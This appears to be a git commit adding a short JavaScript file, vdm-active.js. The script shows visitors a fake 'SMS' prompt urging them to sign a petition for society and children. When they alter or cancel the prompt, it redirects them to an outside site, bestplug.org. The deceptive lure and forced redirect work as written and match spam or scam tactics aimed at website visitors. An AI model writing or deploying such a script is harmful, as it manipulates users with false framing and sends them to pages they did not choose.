180d4083393db030256e5b3ecb67622bb20d59df
vibeblog <enom02567@gmail.com>
2025-05-04 22:19:47 +0100

    Create vdm-active.js

---
+++ vdm-active.js
@@ -0,0 +1,5 @@
+var password = 'SIGN PETITION'
+password=prompt('SMS: Save Our Society And Future Of Our Children By Signing This Petition, Press Ok to Sign Now ','SIGN PETITION');
+if (password != 'SIGN PETITION') {
+location.href='https://bestplug.org/vdm.html';
+}
